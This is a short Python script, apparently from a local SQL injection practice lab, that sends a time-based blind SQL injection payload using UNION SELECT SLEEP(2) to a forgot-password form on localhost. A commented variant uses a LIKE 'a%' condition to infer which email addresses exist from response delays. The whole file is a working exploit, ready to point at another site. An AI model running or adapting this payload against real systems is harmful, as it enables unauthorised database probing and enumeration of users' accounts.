import requests
import random

 

# Define the URL you want to send the GET request to
url = "http://localhost/sites/sql_injection/example3/forgetpassword.php"

mydata = {'email':"' union SELECT SLEEP(2) from users -- "}

# check if there is an an email account start with letter a
# mydata = {'email':"' union SELECT SLEEP(2) from users where email like 'a%' -- "}


# Send the POST request and get the response
response = requests.post(url, data=mydata)


# Check the response status code
if response.status_code == 200:
    # The request was successful, access the response content
    print(response.text)
else:
    # The request failed, handle the error
    print(f"Error: {response.status_code}")
